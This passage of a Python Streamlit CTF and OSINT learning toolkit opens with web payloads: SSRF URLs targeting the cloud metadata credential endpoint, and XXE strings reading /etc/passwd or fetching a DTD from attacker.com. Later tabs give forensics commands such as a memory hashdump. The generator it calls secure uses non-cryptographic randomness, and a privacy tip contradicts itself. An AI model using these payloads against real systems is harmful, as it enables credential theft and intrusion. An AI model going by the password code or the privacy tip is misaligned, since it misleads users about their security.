http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IP bypass (127.0.0.1 as decimal)
http://2130706433/""",
            "XXE": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Blind XXE -->
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;""",
        }
        st.code(payloads[wcat])

    # ── FORENSICS ───────────────────────────────────────────────────────
    elif tool == "🔬 Forensics & PCAP":
        st.markdown("""
**Forensics challenges give you files to analyze** — disk images, memory dumps, or network captures (.pcap files).
The goal is usually to find a hidden file, recover deleted data, or read network traffic.

**What you'll need:** Kali Linux (or any Linux) with `binwalk`, `foremost`, `tshark`, and `volatility` installed.
        """)
        ftool = st.radio("What are you working with?", ["PCAP (network capture)", "Disk image", "Memory dump"], horizontal=True, key="ftool")
        if ftool == "PCAP (network capture)":
            st.code("""# Open in Wireshark (GUI)
wireshark capture.pcap

# See all HTTP requests in terminal
tshark -r capture.pcap -Y "http.request"

# Follow a TCP conversation
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Export HTTP files (images, downloads, etc.)
tshark -r capture.pcap --export-objects http,./output/

# Search for the flag directly
strings capture.pcap | grep -iE 'CTF\\{|flag\\{'""", language="bash")
        elif ftool == "Disk image":
            st.code("""# Carve all recoverable files
foremost -i disk.img -o output/

# Find embedded files and extract them
binwalk -e disk.img

# Mount the image to browse files (Linux)
mkdir /mnt/disk
mount -o loop disk.img /mnt/disk
ls /mnt/disk

# Search all files for the flag
grep -r 'CTF{' /mnt/disk 2>/dev/null""", language="bash")
        elif ftool == "Memory dump":
            st.code("""# List running processes
python3 vol.py -f memory.dump windows.pslist

# See what commands were run
python3 vol.py -f memory.dump windows.cmdline

# Dump a suspicious process (replace 1234 with the PID)
python3 vol.py -f memory.dump windows.dumpfiles --pid 1234

# Extract password hashes
python3 vol.py -f memory.dump windows.hashdump

# Scan for strings
strings memory.dump | grep -iE 'CTF\\{|flag\\{'""", language="bash")

    # ── NUMBER BASE CONVERTER ───────────────────────────────────────────
    elif tool == "🔢 Number Base Converter":
        st.markdown("""
**Convert between number bases and ASCII text.** Useful when a CTF challenge gives you a strange-looking number.

Just type anything — a decimal number, hex value, or plain text — and we'll convert it.
        """)
        num_in = st.text_input("Enter a number or text:", placeholder="72  or  48656c6c6f  or  Hello", key="num_in")
        if num_in and num_in.strip():
            v = num_in.strip()
            try:
                if re.fullmatch(r'[0-9a-fA-F]+', v) and not v.isdigit():
                    n = int(v, 16)
                    st.markdown(f"**Treating `{v}` as hex:**")
                    st.markdown(f"- Decimal: `{n}`")
                    st.markdown(f"- Binary: `{bin(n)}`")
                    if len(v) % 2 == 0:
                        st.markdown(f"- ASCII: `{bytes.fromhex(v).decode('utf-8', 'replace')}`")
                elif v.isdigit():
                    n = int(v)
                    st.markdown(f"**Decimal `{n}`:**")
                    st.markdown(f"- Hex: `{hex(n)}`")
                    st.markdown(f"- Binary: `{bin(n)}`")
                    st.markdown(f"- Octal: `{oct(n)}`")
                    st.markdown(f"- ASCII char: `{chr(n) if 32 <= n <= 126 else '(not printable)'}`")
                else:
                    hexed = v.encode().hex()
                    st.markdown(f"**Text `{v}`:**")
                    st.markdown(f"- Hex: `{hexed}`")
                    st.markdown(f"- Decimal bytes: `{' '.join(str(b) for b in v.encode())}`")
                    st.markdown(f"- Binary: `{' '.join(format(b,'08b') for b in v.encode())}`")
            except Exception as e:
                danger(f"Conversion error: {e}")

    # ── XOR DECODER ────────────────────────────────────────────────────
    elif tool == "🔐 XOR Decoder":
        st.markdown("""
**XOR is a simple cipher** where each byte of the message is XOR'd against a key.

If you have a hex string from a CTF and suspect XOR, paste it here. If you know the key, enter it.
If you don't know the key, try single-byte brute force — we'll try all 256 possible keys and show you the readable ones.
        """)
        xor_hex = st.text_input("Hex-encoded ciphertext:", placeholder="1a2b3c4d5e...", key="xor_hex")
        xor_key = st.text_input("XOR key (text or hex, leave blank to brute force):", key="xor_key")
        if st.button("Decode", use_container_width=True) and xor_hex:
            try:
                raw = bytes.fromhex(re.sub(r'[^0-9a-fA-F]', '', xor_hex))
                if xor_key:
                    kb = xor_key.encode() if not re.fullmatch(r'[0-9a-fA-F]+', xor_key) else bytes.fromhex(xor_key)
                    result = bytes([raw[i] ^ kb[i % len(kb)] for i in range(len(raw))])
                    ok(f"Result: `{result.decode('utf-8','replace')}`")
                else:
                    st.markdown("**Brute forcing single-byte XOR (showing printable results only):**")
                    for k in range(256):
                        candidate = bytes([b ^ k for b in raw])
                        if sum(32 <= c <= 126 for c in candidate) > len(raw) * 0.8:
                            ok(f"Key 0x{k:02x} ({k}): `{candidate.decode('ascii','replace')}`")
            except Exception as e:
                danger(f"Error: {e}. Make sure the input is valid hex.")

    # ── MORSE CODE ─────────────────────────────────────────────────────
    elif tool == "📡 Morse Code Decoder":
        st.markdown("""
**Morse code** uses dots (`.`) and dashes (`-`) to represent letters. Each letter is separated by a space, each word by ` / ` or two spaces.

**Examples:**
- `.... .` → `HE`
- `... --- ...` → `SOS`
- `.... . .-.. .-.. ---` → `HELLO`

Paste your Morse code below and click Decode.
        """)
        MORSE = {
            '.-':'A','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I',
            '.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q',
            '.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y',
            '--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4',
            '.....':'5','-....':'6','--...':'7','---..':'8','----.':'9',
            '.-.-.-':'.','--..--':',','..--..':'?','.----.':'\'','-.-.--':'!',
            '-..-.':'/','.--.-.':'@','...-..-':'$',
            '-...':'B',
        }
        morse_in = st.text_area("Morse code:", height=80, placeholder=".... . .-.. .-.. ---   .-- --- .-. .-.. -..", key="morse_in")
        c1, c2 = st.columns(2)
        with c1:
            if st.button("Decode Morse → Text", use_container_width=True) and morse_in:
                words = morse_in.strip().split('   ')
                try:
                    decoded = ' '.join(
                        ''.join(MORSE.get(sym.strip(), '?') for sym in word.split())
                        for word in words
                    )
                    ok(f"**Decoded:** {decoded}")
                except Exception as e:
                    danger(f"Error: {e}")
        with c2:
            encode_text = st.text_input("Or encode text → Morse:", placeholder="HELLO", key="morse_enc")
            if encode_text:
                REV_MORSE = {v: k for k, v in MORSE.items()}
                encoded = '   '.join(
                    ' '.join(REV_MORSE.get(ch.upper(), '?') for ch in word)
                    for word in encode_text.split()
                )
                ok(f"**Morse:** {encoded}")

    # ── JWT DECODER ────────────────────────────────────────────────────
    elif tool == "🔑 JWT Decoder":
        st.markdown("""
**JWT = JSON Web Token.** It's a three-part token used for authentication, split by dots:
`header.payload.signature`

Each part is Base64-encoded. The payload contains claims like user ID, expiry time, and permissions.

**In CTFs**, JWTs sometimes contain flags in the payload, or you can forge them by changing the algorithm to `none`.

**How to use:** Paste the full JWT token below. We decode the header and payload — you can read everything except the signature.
        """)
        jwt_in = st.text_area("JWT token:", height=80, placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxx", key="jwt_in")
        if st.button("Decode JWT", use_container_width=True) and jwt_in:
            parts = jwt_in.strip().split('.')
            if len(parts) != 3:
                danger("Not a valid JWT — should have exactly 2 dots separating 3 parts.")
            else:
                import json as _json
                for i, (label, part) in enumerate(zip(["Header", "Payload"], parts[:2])):
                    try:
                        pad = part + "=" * ((4 - len(part) % 4) % 4)
                        decoded = base64.urlsafe_b64decode(pad).decode("utf-8", errors="replace")
                        parsed = _json.loads(decoded)
                        st.markdown(f"**{label}:**")
                        st.json(parsed)
                        # Flag detection
                        flat = _json.dumps(parsed).lower()
                        if any(x in flat for x in ['flag{', 'ctf{', 'flag']):
                            ok(f"⚑ Possible flag found in {label}!")
                    except Exception as e:
                        danger(f"Couldn't decode {label}: {e}")
                warn("Signature is NOT verified here — this only reads the data inside.")

    # ── URL ENCODER / DECODER ──────────────────────────────────────────
    elif tool == "🌐 URL Encoder / Decoder":
        st.markdown("""
**URL encoding** replaces special characters with `%XX` codes so they can be safely used in URLs.

**Common in CTFs when:**
- A URL has `%3D`, `%2F`, `%20` etc. in it
- You need to inject a payload into a URL parameter
- You're reading a web challenge and something looks weird in the URL

**Examples:**
- `hello world` → `hello%20world`
- `flag{test}` → `flag%7Btest%7D`
- `' OR 1=1--` → `%27%20OR%201%3D1--`
        """)
        url_in = st.text_area("Text to encode or decode:", height=80, placeholder="hello world  or  hello%20world", key="url_in")
        if url_in:
            c1, c2 = st.columns(2)
            with c1:
                encoded = urllib.parse.quote(url_in.strip(), safe='')
                st.markdown("**URL Encoded:**")
                st.code(encoded)
            with c2:
                decoded = urllib.parse.unquote(url_in.strip())
                st.markdown("**URL Decoded:**")
                st.code(decoded)
            # Double-encoded detection
            if '%25' in url_in:
                warn("Looks double-encoded (has `%25`). Click URL Decoded twice to fully decode.")

    # ── BASE32 ────────────────────────────────────────────────────────
    elif tool == "📦 Base32 Decoder":
        st.markdown("""
**Base32** is similar to Base64 but only uses uppercase letters A-Z and digits 2-7.
It's used in some CTFs, OTP/2FA seeds, and Tor `.onion` addresses.

**How to identify it:** All uppercase, only A-Z and 2-7, usually ends with `=` or `====`.
> Example: `JBSWY3DPEBLW64TMMQ======` → decodes to `Hello, World!`
        """)
        b32_in = st.text_area("Base32 text:", height=80, placeholder="JBSWY3DPEBLW64TMMQ======", key="b32_in")
        c1, c2 = st.columns(2)
        with c1:
            if st.button("Decode Base32", use_container_width=True) and b32_in:
                try:
                    pad = b32_in.strip().upper()
                    pad += "=" * ((8 - len(pad) % 8) % 8)
                    result = base64.b32decode(pad).decode("utf-8", errors="replace")
                    ok(f"**Decoded:** {result}")
                except Exception as e:
                    danger(f"Not valid Base32: {e}")
        with c2:
            b32_enc = st.text_input("Or encode text → Base32:", placeholder="Hello, World!", key="b32_enc")
            if b32_enc:
                ok(f"**Base32:** {base64.b32encode(b32_enc.encode()).decode()}")


# ── TAB 6: DEEP FILE SCAN ───────────────────────────────────────────────
with tab6:
    sec("Deep File Scan")
    st.markdown("""
**Upload any file** and we'll pull it apart:
- Calculate its SHA256 hash (good for verifying integrity)
- Measure its entropy — high entropy (7-8) means it's likely encrypted or compressed
- Extract all readable strings from the raw bytes
- Show a visual entropy heatmap

**What's entropy?** It measures randomness. Normal text files have low entropy (~3-5). Encrypted files or compressed archives have high entropy (~7.5-8).
    """)
    tip("Try uploading a .jpg, .pdf, .zip, or any binary file. Encrypted sections will show up bright red on the heatmap.")

    deep_f = st.file_uploader("Choose a file", key="deep_f")
    if deep_f:
        fb = deep_f.getvalue()
        fname = deep_f.name
        md5h = hashlib.md5(fb).hexdigest()
        sha256h = hashlib.sha256(fb).hexdigest()
        glass(f"<b>{fname}</b><br>Size: {len(fb):,} bytes<br>MD5: <code>{md5h}</code><br>SHA256: <code>{sha256h}</code>")

        if len(fb) > 0:
            freq = Counter(fb)
            probs = [freq[b] / len(fb) for b in freq]
            entropy = -sum(p * math.log2(p) for p in probs if p > 0)
            st.metric("Shannon Entropy", f"{entropy:.2f} / 8.0",
                      help="7-8 = encrypted/compressed. 0-4 = plain text.")

            # Entropy heatmap — fixed column count
            n_blocks = min(64, len(fb))
            bsz = max(1, len(fb) // n_blocks)
            ents = []
            for i in range(0, len(fb), bsz):
                blk = fb[i:i+bsz]
                if blk:
                    fq = Counter(blk)
                    pv = [fq[b] / len(blk) for b in fq]
                    ents.append(-sum(p * math.log2(p) for p in pv if p > 0))
            n = min(64, len(ents))
            if n > 0:
                st.markdown("**Entropy heatmap** (blue = low / normal, red = encrypted/compressed):")
                cols = st.columns(n)
                for idx in range(n):
                    e = ents[idx]
                    color = f"hsl({int(240 - e * 30)}, 80%, 50%)"
                    cols[idx].markdown(
                        f"<div style='background:{color};height:24px;border-radius:4px;' title='{e:.2f}'></div>",
                        unsafe_allow_html=True)

        strings_found = re.findall(rb"[\x20-\x7E]{4,}", fb)
        if strings_found:
            unique_strings = list(dict.fromkeys(s.decode("ascii", "ignore") for s in strings_found))
            with st.expander(f"🔤 Readable strings found ({len(unique_strings)}) — click to expand"):
                st.code("\n".join(unique_strings[:100]))
            st.download_button("📥 Download all strings as .txt",
                               "\n".join(unique_strings[:500]),
                               file_name=f"{fname}_strings.txt")


# ── TAB 7: NETWORK RECON ────────────────────────────────────────────────
with tab7:
    sec("Network Recon")
    st.markdown("""
**Enter an IP address or domain name** to get:
- DNS records (what servers are behind this domain?)
- Geolocation (what country/city is this IP in?)
- Links to threat intelligence databases (VirusTotal, Shodan)

**What's DNS?** Domain Name System — it translates domain names (like google.com) into IP addresses (142.250.80.46).
Looking up DNS records tells you what mail servers a company uses, what IP addresses a domain points to, and more.
    """)
    tip("Try entering a domain like `google.com` or an IP like `8.8.8.8` to see what comes back.")

    net_t = st.text_input("IP address or domain", placeholder="8.8.8.8  or  example.com", key="net_t")
    if st.button("Run Recon", use_container_width=True, key="net_go") and net_t:
        tgt = net_t.strip().lower()
        is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', tgt))
        glass(f"<b>Target:</b> {tgt}")

        if HAS_DNS and not is_ip:
            sec("DNS Records")
            tip("A = IPv4 address, MX = mail server, TXT = verification/SPF records, NS = name servers")
            found_dns = False
            for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT']:
                try:
                    answers = dns.resolver.resolve(tgt, rtype, lifetime=4)
                    for ans in answers:
                        rcard(f"<code>{rtype}</code> &nbsp; {str(ans)[:150]}")
                        found_dns = True
                except: pass
            if not found_dns:
                st.info("No DNS records found. Check if the domain is correct.")

        if is_ip:
            sec("IP Geolocation")
            try:
                geo = requests.get(
                    f"http://ip-api.com/json/{tgt}?fields=status,country,city,isp,org,lat,lon",
                    timeout=5).json()
                if geo.get('status') == 'success':
                    glass(f"<b>Country:</b> {geo.get('country','?')}<br>"
                          f"<b>City:</b> {geo.get('city','?')}<br>"
                          f"<b>ISP:</b> {geo.get('isp','?')}<br>"
                          f"<b>Org:</b> {geo.get('org','?')}<br>"
                          f"<b>Coordinates:</b> {geo.get('lat','?')}, {geo.get('lon','?')}")
            except:
                st.info("Couldn't fetch geolocation right now.")

        sec("Threat Intelligence")
        st.markdown("These sites have huge databases of known threats, malware, and scanned services:")
        c1, c2, c3 = st.columns(3)
        kind = 'ip-address' if is_ip else 'domain'
        c1.link_button("VirusTotal", f"https://www.virustotal.com/gui/{kind}/{tgt}", use_container_width=True)
        c2.link_button("Shodan", f"https://www.shodan.io/search?query={tgt}", use_container_width=True)
        c3.link_button("AbuseIPDB", f"https://www.abuseipdb.com/check/{tgt}", use_container_width=True)


# ── TAB 8: PASSWORDS ────────────────────────────────────────────────────
with tab8:
    sec("Password Tools")
    st.markdown("""
Three things you can do here:
- **Check a password** — see how strong it actually is and what it would take to crack
- **Generate passwords** — get secure random passwords you can actually use
- **Hash text** — turn any string into MD5/SHA1/SHA256 (useful for CTFs and understanding how password storage works)
    """)

    pw_mode = st.radio("What do you need?", ["Check a password", "Generate passwords", "Hash something"], horizontal=True)

    if pw_mode == "Check a password":
        tip("Your password never leaves your browser — this check runs entirely on the server with no logging.")
        pw_in = st.text_input("Password to check:", type="password", placeholder="type your password here", key="pw_in")
        if st.button("Check it", key="pw_check") and pw_in:
            p = pw_in
            score = 0
            notes = []
            if len(p) >= 16: score += 3
            elif len(p) >= 12: score += 2
            elif len(p) >= 8: score += 1
            else: notes.append("Too short — use at least 12 characters")
            if re.search(r"[a-z]", p): score += 1
            else: notes.append("Add lowercase letters")
            if re.search(r"[A-Z]", p): score += 1
            else: notes.append("Add uppercase letters")
            if re.search(r"\d", p): score += 1
            else: notes.append("Add numbers")
            if re.search(r"[^a-zA-Z0-9]", p): score += 2
            else: notes.append("Add symbols like !@#$%")
            if score >= 8: ok("Strong password.")
            elif score >= 5: warn("Decent password, but could be stronger.")
            else: danger("Weak password — easy to crack.")
            pills([("Length", len(p)), ("Score", f"{score}/9")])
            for n in notes:
                st.markdown(f"- {n}")

    elif pw_mode == "Generate passwords":
        tip("These are generated randomly each time. Passwords are never stored.")
        col1, col2 = st.columns(2)
        with col1: pw_len = st.slider("Length", 8, 64, 20)
        with col2: pw_count = st.slider("How many", 1, 10, 5)
        include_symbols = st.checkbox("Include symbols (!@#$%)", value=True)
        if st.button("Generate", use_container_width=True):
            chars = string.ascii_letters + string.digits
            if include_symbols: chars += "!@#$%^&*-_=+"
            for _ in range(pw_count):
                st.code(''.join(random.choices(chars, k=pw_len)))

    elif pw_mode == "Hash something":
        st.markdown("""
**Hashing** converts any text into a fixed-length string. Same input always gives the same output.
Used to store passwords safely (though MD5 and SHA1 are outdated for that purpose now).

Useful in CTFs when you need to generate a hash to compare with a target.
        """)
        text = st.text_input("Text to hash:", placeholder="hello world", key="hash_text")
        if text:
            st.code(f"MD5:     {hashlib.md5(text.encode()).hexdigest()}")
            st.code(f"SHA-1:   {hashlib.sha1(text.encode()).hexdigest()}")
            st.code(f"SHA-256: {hashlib.sha256(text.encode()).hexdigest()}")
            st.code(f"SHA-512: {hashlib.sha512(text.encode()).hexdigest()}")


st.markdown(
    "<div style='text-align:center;color:#2a4050;font-size:.7rem;padding:.8rem 0 .4rem'>"
    "OSINT Suite · built for learners and researchers · 2026"
    "</div>",
    unsafe_allow_html=True)
